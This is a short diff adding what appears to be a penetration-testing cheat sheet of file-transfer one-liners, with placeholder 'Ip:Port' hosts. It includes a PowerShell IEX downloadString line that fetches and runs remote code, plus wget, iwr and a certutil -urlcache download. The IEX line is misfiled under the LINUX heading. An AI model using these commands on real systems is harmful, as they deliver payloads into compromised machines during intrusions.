@@ -1,0 +1,8 @@
+LINUX
+-IEX(New-Object Net.WebClient).downloadString("Ip:Port/file")
+-wget http://Ip:Port/file
+
+
+WINDOWS
+-iwr http://Ip:Port/file -OutFile outFile
+-certutil -urlcache -split -f http://Ip:Port/file outFile
